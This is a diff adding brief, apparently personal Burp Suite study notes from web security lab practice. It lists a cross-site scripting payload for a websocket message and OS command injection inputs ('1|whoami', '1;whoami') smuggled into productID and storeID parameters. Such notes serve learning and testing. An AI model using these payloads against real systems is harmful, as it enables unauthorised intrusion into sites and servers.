@@ -1,0 +1,7 @@
+burp suite:
+
+websocket:
+vulnerability ===>>> <img src=1 onerror=alert(origin)>
+
+repeater:
+vulnerability ===>>> os command injection ===>>> productID & storeID ===>>> 1|whoami  * 1;whoami 
